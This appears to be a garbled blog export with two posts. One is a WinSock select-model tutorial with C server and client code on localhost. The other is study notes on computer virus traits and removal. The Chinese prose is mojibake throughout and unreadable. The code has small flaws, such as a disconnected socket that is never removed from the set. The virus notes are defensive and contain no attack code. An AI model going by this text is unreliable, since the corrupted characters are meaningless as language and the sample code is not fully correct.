ä½¿ç”¨FD_ZEROå®ï¼Œåˆå§‹åŒ–è‡ªå·±æ„Ÿå…´è¶£çš„æ¯ä¸€ä¸ªfd_seté›†åˆã€‚ ä½¿ç”¨FD_SETå®ï¼Œå°†è¦æ£€æŸ¥çš„å¥—æ¥å­—å¥æŸ„æ·»åŠ åˆ°è‡ªå·±æ„Ÿå…´è¶£çš„æ¯å“¥fd_seté›†åˆä¸­ï¼Œç›¸å½“äºåœ¨æŒ‡å®šçš„fd_seté›†åˆä¸­ï¼Œè®¾ç½®å¥½è¦æ£€æŸ¥çš„I&#x2F;Oæ´»åŠ¨ã€‚ è°ƒç”¨selectå‡½æ•°ï¼Œç„¶åç­‰å¾…ã€‚selectå®Œæˆè¿”å›åï¼Œä¼šä¿®æ”¹æ¯ä¸ªfd_setç»“æ„ï¼Œåˆ é™¤é‚£äº›ä¸å­˜åœ¨å¾…å†³I&#x2F;Oæ“ä½œçš„å¥—æ¥å­—å¥æŸ„ï¼Œåœ¨å„ä¸ªfd_seté›†åˆä¸­è¿”å›ç¬¦åˆæ¡ä»¶çš„å¥—æ¥å­—ã€‚ æ ¹æ®selectçš„è¿”å›å€¼ï¼Œä½¿ç”¨FD_ISSETå®ï¼Œå¯¹æ¯ä¸ªfd_seté›†åˆè¿›è¡Œæ£€æŸ¥ï¼Œåˆ¤æ–­ä¸€ä¸ªå¾…å®šçš„å¥—æ¥å­—æ˜¯å¦ä»åœ¨é›†åˆä¸­ï¼Œä¾¿å¯åˆ¤æ–­å‡ºå“ªäº›å¥—æ¥å­—å­˜åœ¨ç€å°šæœªå®Œæˆçš„I&#x2F;Oæ“ä½œã€‚ çŸ¥é“äº†æ¯ä¸ªé›†åˆä¸­æœªå®Œæˆçš„I&#x2F;Oæ“ä½œä¹‹åï¼Œå¯¹ç›¸åº”çš„å¥—æ¥å­—çš„I&#x2F;Oè¿›è¡Œå¤„ç†ï¼Œç„¶åè¿”å›æ­¥éª¤1ï¼Œç»§ç»­è¿›è¡Œselectå¤„ç†ã€‚ å®éªŒè¿‡ç¨‹ å°†å®¢æˆ·ç«¯ä¸­è°ƒç”¨recvå‡½æ•°çš„éƒ¨åˆ†éƒ½åˆ æ‰ï¼Œä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯åªèƒ½ç»™æœåŠ¡å™¨å‘æ¶ˆæ¯ï¼Œä¸èƒ½æ¥æ”¶æ¶ˆæ¯ã€‚ selectæ¨¡å‹ä¹Ÿéœ€è¦å¼•ç”¨å¤´æ–‡ä»¶åº“æ–‡ä»¶ï¼Œæ‰“å¼€ç½‘ç»œåº“ï¼Œæ ¡éªŒç‰ˆæœ¬ï¼Œåˆ›å»ºç›‘å¬å¥—æ¥å­—ï¼Œç»‘å®šåœ°å€ï¼Œå¼€å§‹ç›‘å¬ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªfd_setç»“æ„ä½“ï¼Œå¹¶æŠŠç›‘å¬å¥—æ¥å­—æ”¾è¿™ä¸ªé›†åˆä¸­ã€‚ åœ¨ä¸€ä¸ªæ­»å¾ªç¯ä¸­è°ƒç”¨selectå‡½æ•°ï¼Œå¹¶åˆ¤æ–­selectçš„è¿”å›å€¼ã€‚ è‹¥è¿”å›å€¼ä¸ºSOCKET_ERRORï¼Œåˆ™æŠ¥é”™å¹¶åšç›¸åº”å¤„ç†ï¼› è‹¥è¿”å›å€¼ä¸º0, åˆ™ç»§ç»­ï¼› è‹¥è¿”å›å€¼å¤§äº0ï¼Œè¯´æ˜selectå‡½æ•°æœ‰ååº”ã€‚æœ‰ååº”å°±è¦åŒºåˆ†æ˜¯ç›‘å¬å¥—æ¥å­—è¿˜æ˜¯å“åº”å¥—æ¥å­—å¯¼è‡´çš„ã€‚è‹¥æ˜¯ç›‘å¬å¥—æ¥å­—å¯¼è‡´çš„ï¼Œå°±è°ƒç”¨acceptå‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„å“åº”å¥—æ¥å­—ï¼Œå¹¶æŠŠè¿™ä¸ªå“åº”å¥—æ¥å­—æ”¾åˆ°ç¬¬2æ­¥å®šä¹‰çš„fd_setç»“æ„å½“ä¸­ã€‚å¦‚æœæ˜¯å“åº”å¥—æ¥å­—ï¼Œå°±è°ƒç”¨recvå‡½æ•°æ¥æ”¶å®¢æˆ·æœºå‘æ¥çš„æ¶ˆæ¯ã€‚ æœ€åé‡Šæ”¾æ‰æ‰€æœ‰çš„å¥—æ¥å­—ï¼Œå¹¶å…³é—­ç½‘ç»œåº“ æµ‹è¯•ã€‚å…ˆå¼€å§‹è¿è¡Œselectæ¨¡å‹ï¼Œç„¶ååœ¨å®¢æˆ·ç«¯çš„Debug&#x2F;Releaseæ–‡ä»¶å¤¹ä¸­åŒå‡»exeæ–‡ä»¶å³å¯æ‰“å¼€å¤šä¸ªå®¢æˆ·ç«¯ï¼Œè¿™äº›å®¢æˆ·ç«¯å‡å¯ç»™æœåŠ¡å™¨å‘æ¶ˆæ¯ã€‚ æµ‹è¯•å®Œæˆåï¼Œå¯ä»¥åœ¨acceptå‡½æ•°ä¹‹åè°ƒç”¨sendå‡½æ•°ï¼Œå‘æ¶ˆæ¯ç»™å®¢æˆ·ç«¯æç¤ºè¿æ¥æˆåŠŸã€‚ç›¸åº”çš„ï¼Œå°±éœ€è¦å…ˆåœ¨å®¢æˆ·ç«¯è°ƒç”¨recvå‡½æ•°æ¥æ”¶æ­¤æ¶ˆæ¯ã€‚ ğŸ‘‰åˆ›å»ºæœåŠ¡å™¨ç«¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;#include &lt;WinSock2.h&gt;#include &lt;WS2tcpip.h&gt;//winsock2.hè½¬åˆ°æ–‡æ¡£ï¼Œå¯ä»¥æŸ¥çœ‹å½“ä¸”ç¼–è¯‘å™¨ç¯å¢ƒæ”¯æŒçš„æœ€é«˜ç‰ˆæœ¬//å¼•ç”¨åº“æ–‡ä»¶#pragma comment(lib,&quot;Ws2_32.lib&quot;)int main(void)&#123; //æ‰“å¼€ç½‘ç»œåº“ WORD wdVersion = MAKEWORD(2, 2); WSADATA wsaData; if (0 != WSAStartup(wdVersion, &amp;wsaData)) &#123; printf(&quot;WSAStartup fail!&quot;); return -1; &#125; //æ ¡éªŒç‰ˆæœ¬ if (2 != HIBYTE(wsaData.wVersion) || 2 != LOBYTE(wsaData.wVersion)) &#123; printf(&quot;Version fail!&quot;); //å…³é—­åº“ WSACleanup(); return -1; &#125; //åˆ›å»ºç›‘å¬å¥—æ¥å­— SOCKET socketListen = socket(AF_INET, SOCK_STREAM, 0); if (SOCKET_ERROR == socketListen) &#123; printf(&quot;socket fail!&quot;); //å…³é—­åº“ WSACleanup(); return -1; &#125; //ç»‘å®šåœ°å€ SOCKADDR_IN sockAddress; sockAddress.sin_family = AF_INET;//é€šä¿¡åŸŸä¸ºIPV4 //sockAddress.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);//å›é€åœ°å€ï¼Œä¸»è¦ç”¨äºç½‘ç»œè½¯ä»¶æµ‹è¯•ä»¥åŠæœ¬åœ°æœºè¿›ç¨‹é—´é€šä¿¡ inet_pton(AF_INET, &quot;127.0.0.1&quot;, (void*)&amp;sockAddress.sin_addr); sockAddress.sin_port = htons(51314); if (SOCKET_ERROR == bind(socketListen, (struct sockaddr*)&amp;sockAddress, sizeof(sockAddress))) &#123; printf(&quot;bind fail!&quot;); //å…³é—­ç›‘å¬å¥—æ¥å­— closesocket(socketListen); //å…³é—­åº“ WSACleanup(); return -1; &#125; //å¼€å§‹ç›‘å¬ if (SOCKET_ERROR == listen(socketListen, 5)) &#123; printf(&quot;listen fail!&quot;); //å…³é—­ç›‘å¬å¥—æ¥å­— closesocket(socketListen); //å…³é—­åº“ WSACleanup(); return -1; &#125; //ç”³æ˜ä¸€ä¸ªfd_setç»“æ„ä½“å­˜æ”¾å¥—æ¥å­—ï¼Œå¯ä»¥å³é”®è½¬å®šä¹‰æŸ¥çœ‹å®ƒçš„ç»“æ„ fd_set allSockets; //åˆå§‹åŒ– FD_ZERO(&amp;allSockets); //æŠŠç›‘å¬å¥—æ¥å­—æ”¾åˆ°fd_setè¿™ä¸ªé›†åˆä¸­ FD_SET(socketListen, &amp;allSockets); while (true) &#123; //ç”±äºç»™selectä¼ å…¥ä¸€ä¸ªfd_setç»“æ„ä½“ï¼Œå®ƒåªè¿”å›fd_setä¸­æœ‰å“åº”çš„å¥—æ¥å­—ï¼Œæ‰€ä»¥éœ€è¦å®šä¹‰ä¸€ä¸ªä¸­è½¬å˜é‡ fd_set TempSockets = allSockets; //æœ€å¤§ç­‰å¾…æ—¶é—´ struct timeval st; st.tv_sec = 10; st.tv_usec = 0; //è°ƒç”¨selectå‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬å°†ç¬¬ä¸‰ä¸ªå’Œç¬¬å››ä¸ªå‚æ•°è®¾ä¸ºäº†NULLï¼Œ //å³åªæ˜¯å…³å¿ƒå¯è¯»çš„å¥—æ¥å­—ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨acceptå’Œrecvçš„æƒ…å†µ int ret = select(0, &amp;TempSockets, NULL, NULL, &amp;st); //åˆ¤æ–­selectçš„è¿”å›å€¼åˆ†ä¸ºSOCKET_ERRORï¼Œ0, å’Œå¤§äº0ä¸‰ç§æƒ…å†µ if (ret == SOCKET_ERROR) &#123; printf(&quot;select failï¼&quot;); break; &#125; if (0 == ret) //æ²¡æœ‰ååº”ï¼Œç»§ç»­ &#123; continue; &#125; if (ret &gt; 0) &#123; //selectå‡½æ•°æœ‰ååº”ï¼Œæœ‰ååº”å°±è¦åŒºåˆ†æ˜¯ç›‘å¬å¥—æ¥å­—è¿˜æ˜¯å“åº”å¥—æ¥å­—å¯¼è‡´çš„ for (u_int i = 0; i &lt; TempSockets.fd_count; i++) &#123; //æ˜¯ç›‘å¬å¥—æ¥å­—å¯¼è‡´çš„ if (TempSockets.fd_array[i] == socketListen) &#123; //éœ€è¦åˆ›å»ºå“åº”å¥—æ¥å­— SOCKET SockAccept = accept(socketListen, NULL, NULL); //åˆ¤æ–­acceptå‡½æ•°æ˜¯å¦è°ƒç”¨å¤±è´¥ï¼Œå¤±è´¥çš„è¿”å›å€¼æ˜¯INVALID_SOCKETï¼Œä¸æ˜¯SOCKET_ERROR if (SockAccept == INVALID_SOCKET) &#123; //åˆ›å»ºå“åº”å¥—æ¥å­—å¤±è´¥ printf(&quot;åˆ›å»ºå“åº”å¥—æ¥å­—å¤±è´¥ï¼&quot;); continue; &#125; //æŠŠæ–°åˆ›å»ºçš„å“åº”å¥—æ¥å­—ä¹Ÿæ”¾åˆ°fd_seté›†åˆä¸­ FD_SET(SockAccept, &amp;allSockets); //ç»™å®¢æˆ·ç«¯å‘æ¶ˆæ¯ if (SOCKET_ERROR == send(SockAccept, &quot;æˆ‘æ˜¯æœåŠ¡å™¨ï¼Œæ‚¨å·²æˆåŠŸè¿æ¥&quot;, strlen(&quot;æˆ‘æ˜¯æœåŠ¡å™¨ï¼Œæ‚¨å·²æˆåŠŸè¿æ¥&quot;), 0)) &#123; printf(&quot;send fail!&quot;); //å…³é—­å“åº”å¥—æ¥å­— closesocket(SockAccept); //å…³é—­åº“ WSACleanup(); return -1; &#125; &#125; else &#123; //æ˜¯å“åº”å¥—æ¥å­—å¯¼è‡´çš„,é‚£å°±éœ€è¦è°ƒç”¨recvå‡½æ•° //åˆ¤æ–­å®¢æˆ·ç«¯è¿æ¥çš„é›†åˆä¸­æ˜¯å¦æœ‰éœ€è¦æ¥æ”¶çš„æ•°æ® char szRecvBuffer[1024] = &#123; 0 &#125;; int nReturnValue = recv(TempSockets.fd_array[i], szRecvBuffer, sizeof(szRecvBuffer) - 1, 0); if (0 == nReturnValue) &#123; //å®¢æˆ·ç«¯æ­£å¸¸å…³é—­ printf(&quot;å®¢æˆ·ç«¯å·²ä¸‹çº¿&quot;); //ä»é›†åˆä¸­åˆ æ‰Socketï¼Œè¿˜å¾—è°ƒç”¨closesocketå…³é—­è¿™ä¸ªsocket SOCKET SockTemp = TempSockets.fd_array[i]; FD_CLR(TempSockets.fd_array[i], &amp;allSockets); closesocket(SockTemp); &#125; else if (SOCKET_ERROR == nReturnValue) &#123; //ç½‘ç»œä¸­æ–­ int nRes = WSAGetLastError(); printf(&quot;å“åº”å¥—æ¥å­—%dæ‰€å¯¹åº”çš„å®¢æˆ·ç«¯ä¸­æ–­è¿æ¥\\n&quot;, TempSockets.fd_array[i]); //åŒæ ·éœ€è¦ä»é›†åˆåˆ æ‰å¥—æ¥å­—å’Œå…³é—­å®ƒã€‚ &#125; else &#123; //æ¥æ”¶åˆ°å®¢æˆ·ç«¯æ¶ˆæ¯ printf(&quot;Data from Socket %d : %s \\n&quot;, TempSockets.fd_array[i],szRecvBuffer); &#125; &#125; &#125; &#125; &#125; //é‡Šæ”¾æ‰€æœ‰socket for (u_int i = 0; i &lt; allSockets.fd_count; i++) &#123; closesocket(allSockets.fd_array[i]); &#125; //å…³é—­ç½‘ç»œåº“ WSACleanup(); system(&quot;pause&quot;); return 0;&#125; ğŸ‘‰åˆ›å»ºå®¢æˆ·ç«¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;WinSock2.h&gt;#include &lt;WS2tcpip.h&gt;#pragma comment(lib,&quot;Ws2_32.lib&quot;)int main()&#123; //æ‰“å¼€ç½‘ç»œåº“ WORD wdVersion = MAKEWORD(2, 2); WSADATA wsaData; if (0 != WSAStartup(wdVersion, &amp;wsaData)) &#123; printf(&quot;WSAStartup fail!&quot;); return -1; &#125; //æ ¡éªŒç‰ˆæœ¬ if (2 != HIBYTE(wsaData.wHighVersion) || 2 != LOBYTE(wsaData.wVersion)) &#123; printf(&quot;Version fail!&quot;); //å…³é—­åº“ WSACleanup(); return -1; &#125; //åˆ›å»ºä¸€ä¸ªSOCKET ç›‘å¬ //å¥—æ¥å­—çš„ç±»å‹ï¼Œä½¿ç”¨çš„åè®®ä¸€å®šè¦å’ŒæœåŠ¡å™¨çš„ç±»å‹å’Œåè®®åŒ¹é…ä¸Š SOCKET socketUser = socket(AF_INET, SOCK_STREAM, 0); if (SOCKET_ERROR == socketUser) &#123; printf(&quot;socket fail!&quot;); //å…³é—­åº“ WSACleanup(); return -1; &#125; //åˆå§‹åŒ–æœåŠ¡å™¨ç«¯çš„åœ°å€ï¼ŒIPå’Œç«¯å£ä¸€å®šè¦å’Œæƒ³è¦è¿æ¥çš„æœåŠ¡å™¨ä¸€æ ·ï¼Œä¸ç„¶å°±è¿æ¥ä¸ä¸Š SOCKADDR_IN sockAddress; sockAddress.sin_family = AF_INET; //IPv4çš„åè®® //sockAddress.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); inet_pton(AF_INET, &quot;127.0.0.1&quot;, (void*)&amp;sockAddress.sin_addr); //æœåŠ¡å™¨åœ°å€ sockAddress.sin_port = htons(51314); //æœåŠ¡å™¨çš„ç«¯å£ //å®¢æˆ·æœºç«¯ä¸»åŠ¨è¿æ¥æœåŠ¡å™¨ç«¯ if (SOCKET_ERROR == connect(socketUser, (struct sockaddr*)&amp;sockAddress, sizeof(sockAddress))) &#123; printf(&quot;connect fail!\\n&quot;); //int a=WSAGetLastError(); //printf(&quot;error code : %d\\n&quot;, a); //å…³é—­å¥—æ¥å­— closesocket(socketUser); //å…³é—­åº“ WSACleanup(); return -1; &#125; //æ¥æ”¶æœåŠ¡å™¨è¿”å›çš„ä¿¡æ¯ char szBuffer[1024] = &#123; 0 &#125;; //æ¥æ”¶æ•°æ®ï¼Œ è·ŸæœåŠ¡å™¨ç«¯ä¸€æ · int nReturnValue = recv(socketUser, szBuffer, sizeof(szBuffer), 0); if (0 == nReturnValue) &#123; //å®¢æˆ·ç«¯æ­£å¸¸å…³é—­ é‡Šæ”¾Socket closesocket(socketUser); &#125; else if (SOCKET_ERROR == nReturnValue) &#123; //ç½‘ç»œä¸­æ–­ printf(&quot;è¿æ¥ä¸­æ–­&quot;); &#125; else &#123; //æ¥æ”¶åˆ°å®¢æˆ·ç«¯æ¶ˆæ¯ printf(&quot;server data : %s\\n&quot;, szBuffer); //å‘é€æ¶ˆæ¯ç»™æœåŠ¡å™¨ while (1) &#123; //å‘é€æ•°æ®ï¼Œ è·ŸæœåŠ¡å™¨ç«¯ä¸€æ · char szSendData[1024] = &#123; 0 &#125;; printf(&quot;Input Something : &quot;); scanf_s(&quot;%s&quot;, szSendData, 1024); if (SOCKET_ERROR == send(socketUser, szSendData, strlen(szSendData), 0)) &#123; printf(&quot;send fail!&quot;); //å…³é—­å®¢æˆ·æœºSocket closesocket(socketUser); //å…³é—­åº“ WSACleanup(); return -1; &#125; &#125; &#125; //å…³é—­socket closesocket(socketUser); //å…³é—­ç½‘ç»œåº“ WSACleanup(); system(&quot;pause&quot;); return 0;&#125; ğŸ‘‰æœ€åè¿è¡Œå®¢æˆ·ç«¯ï¼Œç”Ÿæˆè§£å†³æ–¹æ¡ˆä¹‹åï¼Œåˆ°å·¥ç¨‹æ–‡ä»¶å¤¹é‡Œæ‰¾åˆ°exeï¼Œå¼€å¯å¤šä¸ªå®¢æˆ·ç«¯ã€‚","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"å®éªŒ/ç½‘ç»œç¼–ç¨‹","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"WinSock","slug":"WinSock","permalink":"https://gryffinbit.top/tags/WinSock/"}],"author":"Gryffinbit"},{"title":"ç—…æ¯’åŸç†è€ƒç‚¹","slug":"ç—…æ¯’åŸç†è€ƒç‚¹","date":"2020-12-17T10:05:09.000Z","updated":"2024-11-12T07:00:20.000Z","comments":true,"path":"2020/12/17/ç—…æ¯’åŸç†è€ƒç‚¹/","permalink":"https://gryffinbit.top/2020/12/17/%E7%97%85%E6%AF%92%E5%8E%9F%E7%90%86%E8%80%83%E7%82%B9/","excerpt":"","text":"ç—…æ¯’åŸç†è€ƒç‚¹ç—…æ¯’ç¨‹åºä¸€èˆ¬åŸºå…¥å¯¹è±¡çš„ä¾µå…¥ä¸€èˆ¬æœ‰å“ªå‡ ç§æ–¹å¼ã€‚ï¼ˆå¯¹è±¡çš„ä¸åŒæœ‰å“ªå‡ ç§ ç£ç›˜å¼•å¯¼åŒºä¼ æŸ“çš„è®¡ç®—æœºç—…æ¯’ æ“ä½œç³»ç»Ÿä¼ æŸ“ å¯æ‰§è¡Œç¨‹åºä¼ æŸ“ è®¡ç®—æœºç—…æ¯’çš„ç‰¹ç‚¹ è®¡ç®—æœºç—…æ¯’ç‰¹å¾1ï¼šä¼ æŸ“æ€§ å¯ä»¥é€šè¿‡ä¸­ä»‹è¿›è¡Œä¼ æŸ“ï¼Œå¦‚Uç›˜ã€å…‰ç›˜ã€ç”µå­é‚®ä»¶ç­‰ç­‰ã€‚ è®¡ç®—æœºç—…æ¯’ç‰¹å¾2ï¼šç ´åæ€§ å¯ä»¥å½±å“æˆ‘ä»¬è®¡ç®—æœºä¸Šç¨‹åºçš„æ­£å¸¸è¿è¡Œï¼Œåˆ é™¤æˆ‘ä»¬çš„æ–‡ä»¶ã€‚ è®¡ç®—æœºç—…æ¯’ç‰¹å¾3ï¼šéšè”½æ€§ è®¡ç®—æœºç—…æ¯’çš„æœ¬èº«å¤§å°å¾ˆå°ï¼Œï¼Œå®ƒé€šå¸¸è¡£æœåœ¨åœ¨æ­£å¸¸ç¨‹åºä¹‹ä¸­æˆ–ç£ç›˜å¼•å¯¼æ‰‡åŒºä¸­ï¼Œç—…æ¯’ä¼šæƒ³æ–¹è®¾æ³•éšè—è‡ªèº«ã€‚ è®¡ç®—æœºç—…æ¯’ç‰¹å¾4ï¼šæ½œä¼æ€§ æœ‰äº›ç—…æ¯’å¹¶ä¸ä¼šç«‹åˆ»å‘ä½œï¼Œè€Œæ˜¯æ‚„æ‚„çš„éšè—èµ·æ¥ï¼Œç„¶ååœ¨ç”¨æˆ·ä¸å¯Ÿè§‰çš„æƒ…å†µä¸‹è¿›è¡Œä¼ æŸ“ã€‚ è®¡ç®—æœºç—…æ¯’ç‰¹å¾5ï¼šè§¦å‘æ€§ æœ‰äº›ç—…æ¯’è¢«è®¾ç½®äº†ä¸€äº›æ¡ä»¶ï¼Œåªæœ‰å½“æ»¡è¶³äº†è¿™äº›æ¡ä»¶æ—¶æ‰ä¼šå®æ–½æ”»å‡»ã€‚æ¯”è¾ƒå¸¸è§çš„å°±æ˜¯æ—¥æœŸæ¡ä»¶äº†ã€‚ ä»€ä¹ˆå«è®¡ç®—æœºç—…æ¯’è®¡ç®—æœºç—…æ¯’,æ˜¯æŒ‡ç¼–åˆ¶æˆ–è€…åœ¨è®¡ç®—æœºç¨‹åºä¸­æ’å…¥çš„ç ´åè®¡ç®—æœºåŠŸèƒ½æˆ–è€…æ¯åæ•°æ®,å½±å“è®¡ç®—æœºä½¿ç”¨,å¹¶èƒ½è‡ªæˆ‘å¤åˆ¶çš„ä¸€ç»„è®¡ç®—æœºæŒ‡ä»¤æˆ–è€…ç¨‹åºä»£ç ã€‚ è®¡ç®—æœºç—…æ¯’æ€ä¹ˆæ¸…é™¤é’ˆå¯¹äºç‰¹å®šç—…æ¯’çš„æ¸…é™¤ å¼•å¯¼å‹ï¼š ç—…æ¯’ä»£ç æ”¾å…¥è½¯ç›˜æˆ–ç¡¬ç›˜çš„BOOTåŒºï¼Œæˆ–ç¡¬ç›˜çš„ä¸»å¼•å¯¼åŒºã€‚ åšæ³•ï¼šç”¨æ­£å¸¸çš„åˆ†åŒºè¡¨ä¿¡æ¯è¦†ç›–ç—…æ¯’ã€‚å°†ç—…æ¯’åœ¨æ–‡ä»¶åˆ†é…è¡¨ä¸­è®¾ç½®çš„åç°‡ï¼Œä¿®æ”¹å›å¥½ç°‡ï¼Œä½¿ç£ç›˜ç©ºé—´å¯ä»¥ä¾›æ“ä½œç³»ç»Ÿåˆ†é…ä½¿ç”¨ã€‚ æ–‡ä»¶å‹ï¼š ç—…æ¯’ç æ”¾åœ¨å®¿ä¸»ç¨‹åºçš„å‰æˆ–åéƒ¨ï¼Œä»£ç å’Œå®¿ä¸»ç¨‹åºæœ‰æ˜æ˜¾çš„åˆ†ç•Œçº¿ã€‚æ£€æŸ¥æ˜¯å¦è¢«ä¿®æ”¹ã€‚ .COMï¼šå°†æŸ“æ¯’æ–‡ä»¶è¯»å…¥å†…å­˜ï¼Œæ‰¾å‡ºåˆ†ç•Œçº¿ï¼Œå°†ä¿®æ”¹è¿‡çš„ä»£ç å¤åŸï¼Œå°†ä¿®å¤åçš„å®¿ä¸»ç¨‹åºå†™å›ç£ç›˜ã€‚ .EXEï¼šå°†æŸ“æ¯’æ–‡ä»¶è¯»å…¥å†…å­˜ï¼Œæ‰¾å‡ºåˆ†ç•Œçº¿ï¼Œå› ä¸ºexeå¤´éƒ¨è¢«è¯»å…¥å†…å­˜ï¼Œä»£ç åœ°å€æœ‰å˜ã€‚åŠ è½½ç¨‹åºåçš„èµ·å§‹è¿è¡Œåœ°å€ã€ç¨‹åºé•¿åº¦ç­‰ï¼Œæ ¹æ®è®¡ç®—ç»“æœä¿®æ”¹å¤´éƒ¨å¯¹åº”å‚æ•°ã€‚å°†ä»£ç å¤åŸï¼Œè®¾ç½®æ°å½“çš„æ–‡ä»¶é•¿åº¦å’Œåœ°å€å‚æ•°ï¼Œå†™å›ç£ç›˜ã€‚ æ–‡ä»¶ä¸å¼•å¯¼å¤åˆå‹ï¼š ä¾é™„åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸Šï¼Œå½“ä½œè½½ä½“è¿›è¡Œä¼ æ’­ï¼Œå½“è¿è¡Œæ—¶ï¼Œç³»ç»Ÿä¸­æœ‰ç¡¬ç›˜ï¼Œåˆ™ç«‹å³æ„ŸæŸ“ä¸»å¼•å¯¼åŒºï¼Œä»¥åç”¨ç¡¬ç›˜å¯åŠ¨ç³»ç»Ÿæ—¶ï¼Œå°±æœ‰è¯¥ç—…æ¯’ã€‚ åšæ³•ï¼šå°†ç¡¬ç›˜ä¸»å¼•å¯¼åŒºå†…ç—…æ¯’æ¸…é™¤ï¼›è®°å½•æ‰§è¡Œç¨‹åºçš„èµ·å§‹åœ°å€ï¼Œç»ˆæ­¢åœ°å€ï¼Œæ¸…é™¤ç—…æ¯’ä»£ç ã€‚å°†æ–‡ä»¶é•¿åº¦æ”¹ä¸ºæ¸…æ¯’åçš„é•¿åº¦ã€‚ è„šæœ¬è®¡ç®—æœºç—…æ¯’ï¼š åšæ³•ï¼š ç¦ç”¨æ–‡ä»¶ç³»ç»Ÿå¯¹è±¡ å¸è½½Windows Scripting Host åˆ é™¤VBSã€VBEã€JSã€JSEæ–‡ä»¶åç¼€åä¸åº”ç”¨ç¨‹åºçš„æ˜ å°„ åœ¨Windowsç›®å½•ä¸­ï¼Œæ‰¾åˆ°WScript.exeï¼Œæ›´æ”¹åç§°æˆ–åˆ é™¤ æµè§ˆå™¨ActiveXæ§ä»¶è®¾ä¸ºç¦ç”¨ ç¦æ­¢OEè‡ªåŠ¨æ”¶å‘ç”µå­é‚®ä»¶ æ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶æ‰©å±•å å°†ç½‘ç»œè¿æ¥å®‰å…¨çº§åˆ«è®¾ç½®ä¸ºä¸­ç­‰ä»¥ä¸Š å®ç—…æ¯’ï¼š æŸ¥çœ‹noraml.dotï¼Œåˆ é™¤æ¥å†ä¸æ˜çš„å® æŸ¥çœ‹noraml.dotï¼Œç”¨åŸæ–‡ä»¶è¦†ç›–è¢«æ„ŸæŸ“çš„ ç‰¹æ´›ä¼Šæœ¨é©¬ç—…æ¯’ï¼š å¤‡ä»½é‡è¦æ•°æ® ç«‹å³å…³é—­è®¾å¤‡ç”µæº å¤‡ä»½æœ¨é©¬å…¥ä¾µç°åœº ä¿®å¤æœ¨é©¬å±å®³ è •è™«ç—…æ¯’ï¼š ä¸é˜²ç«å¢™äº’åŠ¨ äº¤æ¢æœºè”åŠ¨ é€šçŸ¥HIDSï¼ˆåŸºäºä¸»æœºçš„å…¥ä¾µç›‘æµ‹ï¼‰ æŠ¥è­¦ ç¬¼ç»Ÿæ€§ç—…æ¯’çš„æ¸…é™¤æ–¹å¼ åŸºæœ¬æ–¹æ³• ç®€å•çš„å·¥å…·æ²»ç–—ï¼šwinhexã€debugï¼Œå°†ç—…æ¯’ä»£ç ä»è½¯ä»¶ä¸­æ‘˜é™¤ ä¸“ç”¨å·¥å…·æ²»ç–—ï¼šæ ¹æ®å¯¹ç—…æ¯’ç‰¹å¾çš„è®°å½•ï¼Œè‡ªåŠ¨æ¸…é™¤æ„ŸæŸ“ç¨‹åºä¸­çš„ç—…æ¯’ä»£ç  ä¸€èˆ¬è¿‡ç¨‹ å‰–æç—…æ¯’æ ·æœ¬ï¼šæŒæ¡ç—…æ¯’çš„ç‰¹å¾ï¼Œå‡†ç¡®è¯†åˆ«ç—…æ¯’ ç ”åˆ¶ç—…æ¯’è¯•éªŒæ ·æœ¬ï¼šå¯¹æ¸…é™¤è½¯ä»¶è¿›è¡Œå¤šæ¬¡ä¿®æ”¹å’Œè°ƒè¯• æ‘˜é™¤ç—…æ¯’ä»£ç  æ€æ¯’çš„æ–¹å¼ æ¸…é™¤è¢«æ„ŸæŸ“æ–‡ä»¶ åˆ é™¤ç—…æ¯’æ–‡ä»¶ ç¦æ­¢è®¿é—®ç—…æ¯’æ–‡ä»¶ ç—…æ¯’åˆ é™¤åç§»åˆ°éš”ç¦»åŒº ä¸çŸ¥é“æ˜¯ä¸æ˜¯ç—…æ¯’æ—¶ï¼Œä¸å¤„ç† ä»€ä¹ˆæ˜¯å®ç—…æ¯’ï¼Œå®ƒæ„ŸæŸ“çš„æ–‡ä»¶æ˜¯é‚£äº›ï¼Ÿç‰¹ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿæ£€æµ‹æ–¹æ³•ã€æ¸…é™¤æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Ÿå®ç—…æ¯’ï¼šå¯„åœ¨æ–‡æ¡£æˆ–æ¨¡æ¿çš„å®ä¸­çš„è®¡ç®—æœºç—…æ¯’ï¼Œä¸€æ—¦æ‰“å¼€è¿™æ ·çš„æ–‡æ¡£ï¼Œå®å°±ä¼šè¢«æ‰§è¡Œï¼Œå®ç—…æ¯’è¢«æ¿€æ´»åï¼Œè½¬ç§»åˆ°ç”¨æˆ·çš„è®¡ç®—æœºä¸Šï¼Œå¹¶é©»ç•™åœ¨normalæ¨¡æ¿ï¼Œä»æ­¤æ‰€æœ‰è‡ªåŠ¨ä¿å­˜çš„æ–‡æ¡£éƒ½ä¼šæŸ“ä¸Šå®ç—…æ¯’ã€‚ æ„ŸæŸ“æ–‡ä»¶ï¼šOfficeå®¶æ—ä¸‰å¤§ç³»åˆ—ã€‚ ç‰¹ç‚¹ï¼š ä¼ æ’­é€Ÿåº¦æå¿« åˆ¶ä½œã€å˜ç§æ–¹ä¾¿ ç ´åæ€§æå¤§ å¤šå¹³å°äº¤å‰æ„ŸæŸ“ 